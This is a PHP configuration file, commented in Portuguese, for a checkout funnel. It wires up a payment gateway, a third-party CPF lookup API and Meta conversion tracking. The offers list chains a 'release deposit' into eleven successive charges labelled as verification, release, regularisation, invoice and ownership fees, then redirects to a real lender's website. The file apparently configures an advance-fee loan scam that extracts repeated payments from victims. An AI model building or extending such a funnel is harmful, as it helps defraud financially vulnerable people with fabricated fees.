<?php
if (!defined('CHECKOUT_BOOT')) { http_response_code(403); exit('Forbidden'); }

require_once __DIR__ . '/settings.php';
$s = settings_load();

/* ---------------------------------------------------------------------------
   CHAVES: ficam em secrets.php, que NAO vai para o repositorio.
   Crie esse arquivo no servidor a partir do secrets.example.php.
   --------------------------------------------------------------------------- */
$secrets_file = __DIR__ . '/secrets.php';
$secrets      = is_file($secrets_file) ? require $secrets_file : [];
if (!is_array($secrets)) $secrets = [];

/* A chave salva pelo painel tem prioridade; depois vem o secrets.php. */
$api_key    = $s['gateway']['api_key'] !== '' ? $s['gateway']['api_key'] : ($secrets['tronfy_sk'] ?? '');
$public_key = $secrets['tronfy_pk'] ?? '';

if ($api_key === '') {
    error_log('[config] FALTA A CHAVE DA TRONFY: crie o arquivo "API PHP/secrets.php" (veja secrets.example.php).');
}

return [

    /* ===================== TRONFY ======================================== */
    'tronfy' => [
        'base_url'            => 'https://api.tronfy.com.br/v1',
        'api_key'             => $api_key,      // sk_live_tronfy_... (somente backend)
        'public_key'          => $public_key,   // pk_live_tronfy_... (tokenização de cartão)
        'pix_expires_in_days' => (int)$s['gateway']['pix_expira_dias'],
    ],

    /* ===================== OFERTAS ======================================= */
    'default_offer' => 'main',
    'offers' => [
        'main' => [
            'id'           => 'deposito_liberacao',
            'name'         => $s['produto']['nome'],
            'amount_cents' => (int)$s['produto']['valor_cents'],
            'next_url'     => '../upsell/1/',
        ],
        'up1' => [
            'id'           => 'up1_taxa_verificacao',
            'name'         => 'Taxa de Verificação',
            'amount_cents' => 2681,
            'next_url'     => '../upsell/2/',
        ],
        'up2' => [
            'id'           => 'up2_taxa_educacional',
            'name'         => 'Taxa Educacional',
            'amount_cents' => 1990,
            'next_url'     => '../upsell/3/',
        ],
        'up3' => [
            'id'           => 'up3_liberacao_final',
            'name'         => 'Liberação Final',
            'amount_cents' => 2641,
            'next_url'     => '../upsell/4/',
        ],
        'up4' => [
            'id'           => 'up4_regularizacao',
            'name'         => 'Regularização de Pendência',
            'amount_cents' => 2344,
            'next_url'     => '../upsell/5/',
        ],
        'up5' => [
            'id'           => 'up5_ativacao_cashback',
            'name'         => 'Ativação de Cashback',
            'amount_cents' => 1700,
            'next_url'     => '../upsell/6/',
        ],
        'up6' => [
            'id'           => 'up6_taxa_processamento',
            'name'         => 'Taxa de Processamento',
            'amount_cents' => 2879,
            'next_url'     => '../upsell/7/',
        ],
        'up7' => [
            'id'           => 'up7_taxa_abertura_credito',
            'name'         => 'Taxa de Abertura de Crédito',
            'amount_cents' => 1692,
            'next_url'     => '../upsell/8/',
        ],
        'up8' => [
            'id'           => 'up8_taxa_verificacao_conta',
            'name'         => 'Taxa de Verificação de Conta',
            'amount_cents' => 2681,
            'next_url'     => '../upsell/9/',
        ],
        'up9' => [
            'id'           => 'up9_taxa_emissao_nf',
            'name'         => 'Taxa de Emissão de Nota Fiscal',
            'amount_cents' => 1990,
            'next_url'     => '../upsell/10/',
        ],
        'up10' => [
            'id'           => 'up10_verificacao_titularidade',
            'name'         => 'Verificação de Titularidade',
            'amount_cents' => 2641,
            'next_url'     => '../upsell/11/',
        ],
        'up11' => [
            'id'           => 'up11_ativacao_cashback',
            'name'         => 'Ativação de Cashback',
            'amount_cents' => 1700,
            'next_url'     => 'https://supersim.com.br/',
        ],
    ],

    /* ===================== ORDER BUMPS =================================== */
    'bump' => [
        'ativo'        => (bool)$s['bump']['ativo'],
        'nome'         => $s['bump']['titulo_ok'],
        'amount_cents' => (int)$s['bump']['valor_cents'],
    ],
    'bump2' => [
        'ativo'        => (bool)$s['bump2']['ativo'],
        'nome'         => $s['bump2']['titulo_ok'],
        'amount_cents' => (int)$s['bump2']['valor_cents'],
    ],
    'bump3' => [
        'ativo'        => (bool)$s['bump3']['ativo'],
        'nome'         => $s['bump3']['titulo_ok'],
        'amount_cents' => (int)$s['bump3']['valor_cents'],
    ],

    /* ===================== BLUEGET (Consulta CPF) ======================== */
    'blueget' => [
        'base_url'  => 'https://api.zipcardx.online/api/v1',
        'api_token' => $secrets['blueget_token'] ?? '',
    ],

    /* ===================== META CONVERSIONS API =========================== */
    'meta' => [
        'pixel_id'        => $secrets['meta_pixel_id'] ?? '',
        'access_token'    => $secrets['meta_capi_token'] ?? '',
        'test_event_code' => $secrets['meta_test_event_code'] ?? '',
    ],

    /* ===================== SEGURANÇA ===================================== */
    'security' => [
        'rate_limit_max'    => 12,
        'rate_limit_window' => 600,
        'data_dir'          => __DIR__ . '/data',
    ],
];
